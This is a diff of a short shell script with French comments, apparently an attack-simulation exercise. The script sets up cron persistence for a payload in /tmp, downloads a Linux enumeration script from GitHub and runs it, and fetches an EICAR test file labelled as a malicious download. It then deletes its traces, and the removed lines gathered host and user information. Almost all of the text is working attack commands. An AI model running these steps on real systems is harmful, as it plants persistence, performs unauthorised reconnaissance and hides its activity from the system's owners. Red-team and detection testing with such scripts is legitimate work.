@@ -1,22 +1,17 @@
 #!/bin/sh
 
-#Reconnaissance
-id > /tmp/discover
-who -a >> /tmp/discover
-ps -ef >> /tmp/discover
-df -h >> /tmp/discover
-uname -a >> /tmp/discover
-cat /etc/issue >> /tmp/discover
-cat /etc/*release* >> /tmp/discover
-
 #Persistance
 cp ./payload.sh /tmp/payload.sh
 crontab -l > mycron
 echo "0 0 * * * /tmp/payload.sh" >> mycron
 crontab mycron
-rm mycron
-rm ./payload.sh
+
+#Reconnaissance
+wget 'https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh'; chmod u+x ./LinEnum.sh; ./LinEnum.sh -r discover -e /tmp/ -t
 
 #Téléchargement charge malveillante
 wget 'https://secure.eicar.org/eicar_com.zip'
-wget 'https://secure.eicar.org/eicar.com.txt'
+
+#Nettoyage
+rm mycron
+rm ./payload.sh
